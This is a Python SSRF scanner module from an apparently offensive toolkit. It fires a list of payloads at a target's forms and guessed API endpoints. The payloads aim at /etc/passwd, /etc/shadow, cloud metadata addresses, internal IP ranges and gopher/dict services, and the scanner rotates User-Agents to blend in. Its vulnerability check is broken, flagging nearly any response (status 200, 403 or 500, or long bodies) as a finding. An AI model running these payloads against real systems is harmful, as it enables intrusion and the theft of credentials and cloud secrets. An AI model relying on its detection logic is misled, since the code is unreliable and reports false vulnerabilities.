"""
Server-Side Request Forgery (SSRF) vulnerability scanner module
"""

import logging
import requests
import socket
import random
from bs4 import BeautifulSoup
from colorama import Fore, Style
from urllib.parse import urljoin, urlparse

logger = logging.getLogger('CyberWolf.SSRFScanner')

class SSRFScanner:
    """
    Scanner module for detecting Server-Side Request Forgery (SSRF) vulnerabilities
    """
    
    def __init__(self, timeout=10, verbose=False):
        """
        Initialize the SSRF scanner
        
        Args:
            timeout (int): Request timeout in seconds
            verbose (bool): Enable verbose output
        """
        self.timeout = timeout
        self.verbose = verbose
        self.session = requests.Session()
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15'
        ]
        
        # SSRF payloads to test
        self.ssrf_payloads = [
            # Localhost variations
            'http://localhost',
            'http://127.0.0.1',
            'http://0.0.0.0',
            'http://[::1]',
            'http://localhost:80',
            'http://127.0.0.1:80',
            
            # Internal IP ranges
            'http://192.168.0.1',
            'http://10.0.0.1',
            'http://172.16.0.1',
            
            # File protocol
            'file:///etc/passwd',
            'file:///etc/hosts',
            'file:///etc/shadow',
            
            # DNS rebinding
            'http://169.254.169.254',
            'http://metadata.google.internal',
            'http://169.254.169.254/latest/meta-data/',
            
            # Protocol variations
            'dict://localhost:11211/',
            'gopher://localhost:11211/',
            'ldap://localhost:389/',
            'sftp://localhost:22/',
            
            # URL encoding
            'http://%6c%6f%63%61%6c%68%6f%73%74',
            'http://%31%32%37%2e%30%2e%30%2e%31',
            
            # IPv6
            'http://[::]',
            'http://[::ffff:127.0.0.1]',
            
            # Domain variations
            'http://localhost.localdomain',
            'http://localhost.local',
            'http://localhost.domain',
            
            # Port variations
            'http://localhost:22',
            'http://localhost:3306',
            'http://localhost:5432',
            'http://localhost:27017'
        ]
    
    def scan(self, url, api_key=None):
        """
        Scan the given URL for SSRF vulnerabilities
        
        Args:
            url (str): Target URL to scan
            api_key (str, optional): API key for enhanced scanning
        
        Returns:
            list: Found SSRF vulnerabilities
        """
        logger.info(f"Starting SSRF scan on {url}")
        vulnerabilities = []
        
        try:
            # Find potential SSRF endpoints
            ssrf_endpoints = self._find_ssrf_endpoints(url)
            
            if not ssrf_endpoints:
                self._log_verbose("No potential SSRF endpoints found")
                return vulnerabilities
            
            # Test each endpoint with SSRF payloads
            for endpoint in ssrf_endpoints:
                self._log_verbose(f"Testing endpoint: {endpoint}")
                
                for payload in self.ssrf_payloads:
                    try:
                        # Test with different HTTP methods
                        for method in ['GET', 'POST', 'PUT']:
                            if method == 'GET':
                                response = self.session.get(
                                    endpoint,
                                    params={'url': payload},
                                    headers={'User-Agent': random.choice(self.user_agents)},
                                    timeout=self.timeout,
                                    verify=True
                                )
                            elif method == 'POST':
                                response = self.session.post(
                                    endpoint,
                                    data={'url': payload},
                                    headers={'User-Agent': random.choice(self.user_agents)},
                                    timeout=self.timeout,
                                    verify=True
                                )
                            else:  # PUT
                                response = self.session.put(
                                    endpoint,
                                    data={'url': payload},
                                    headers={'User-Agent': random.choice(self.user_agents)},
                                    timeout=self.timeout,
                                    verify=True
                                )
                            
                            # Check for SSRF indicators in response
                            if self._is_vulnerable_to_ssrf(response, payload):
                                vuln = {
                                    'type': 'SSRF',
                                    'endpoint': endpoint,
                                    'method': method,
                                    'payload': payload,
                                    'status_code': response.status_code,
                                    'response_length': len(response.text),
                                    'evidence': response.text[:200]  # First 200 chars of response
                                }
                                vulnerabilities.append(vuln)
                                self._log_verbose(f"Found SSRF vulnerability at {endpoint} using {method}")
                                
                    except requests.RequestException as e:
                        logger.error(f"Error testing SSRF payload: {str(e)}")
                        continue
            
            # Use API for enhanced scanning if available
            if api_key:
                self._log_verbose("Using API for enhanced SSRF scanning")
                api_vulns = self._api_enhanced_scan(url, api_key)
                vulnerabilities.extend(api_vulns)
            
            logger.info(f"SSRF scan completed. Found {len(vulnerabilities)} vulnerabilities")
            return vulnerabilities
            
        except Exception as e:
            logger.error(f"Error during SSRF scan: {str(e)}")
            print(f"{Fore.RED}[!] Error during SSRF scan: {str(e)}{Style.RESET_ALL}")
            return []
    
    def _find_ssrf_endpoints(self, url):
        """
        Find potential SSRF endpoints on the target
        
        Args:
            url (str): Target URL
        
        Returns:
            list: Potential SSRF endpoints
        """
        endpoints = []
        
        try:
            # Get the main page
            response = self.session.get(
                url,
                headers={'User-Agent': random.choice(self.user_agents)},
                timeout=self.timeout,
                verify=True
            )
            
            # Parse the page for potential SSRF endpoints
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Look for common SSRF endpoint patterns
            for form in soup.find_all('form'):
                action = form.get('action', '')
                if action:
                    full_url = urljoin(url, action)
                    endpoints.append(full_url)
            
            # Look for URL parameters that might be vulnerable
            for link in soup.find_all('a', href=True):
                href = link['href']
                if any(param in href.lower() for param in ['url=', 'image=', 'file=', 'path=', 'load=', 'fetch=']):
                    full_url = urljoin(url, href)
                    endpoints.append(full_url)
            
            # Add common SSRF endpoints
            common_endpoints = [
                '/api/fetch',
                '/api/load',
                '/api/image',
                '/api/url',
                '/api/proxy',
                '/api/import',
                '/api/export',
                '/api/download',
                '/api/upload',
                '/api/convert',
                '/api/render',
                '/api/preview'
            ]
            
            for endpoint in common_endpoints:
                full_url = urljoin(url, endpoint)
                endpoints.append(full_url)
            
            # Remove duplicates
            endpoints = list(set(endpoints))
            
            return endpoints
            
        except Exception as e:
            logger.error(f"Error finding SSRF endpoints: {str(e)}")
            return []
    
    def _is_vulnerable_to_ssrf(self, response, payload):
        """
        Check if the response indicates an SSRF vulnerability
        
        Args:
            response (requests.Response): Response object
            payload (str): SSRF payload used
        
        Returns:
            bool: True if vulnerable, False otherwise
        """
        # Check for common SSRF indicators
        indicators = [
            # Localhost indicators
            'localhost',
            '127.0.0.1',
            '0.0.0.0',
            '[::1]',
            
            # Internal IP indicators
            '192.168.',
            '10.0.',
            '172.16.',
            
            # File content indicators
            'root:',
            'bin/bash',
            'etc/passwd',
            'etc/hosts',
            
            # Cloud metadata indicators
            'metadata.google.internal',
            '169.254.169.254',
            'latest/meta-data',
            
            # Error messages
            'connection refused',
            'connection timed out',
            'no route to host',
            'name or service not known'
        ]
        
        # Check response content
        content = response.text.lower()
        
        # Check if any indicators are present
        for indicator in indicators:
            if indicator.lower() in content:
                return True
        
        # Check for unusual response length
        if len(response.text) > 1000:  # Arbitrary threshold
            return True
        
        # Check for specific status codes
        if response.status_code in [200, 403, 500]:
            return True
        
        return False
    
    def _api_enhanced_scan(self, url, api_key):
        """
        Use API for enhanced SSRF scanning
        
        Args:
            url (str): Target URL
            api_key (str): API key for authentication
        
        Returns:
            list: Additional vulnerabilities found via API
        """
        # This is a placeholder for actual API integration
        # In a real implementation, you would call a security API service
        self._log_verbose("API enhanced scanning is a placeholder in this version")
        return []
    
    def _log_verbose(self, message):
        """Log message if verbose mode is enabled"""
        if self.verbose:
            logger.debug(message)
            print(f"{Fore.CYAN}[SSRF] {message}{Style.RESET_ALL}") 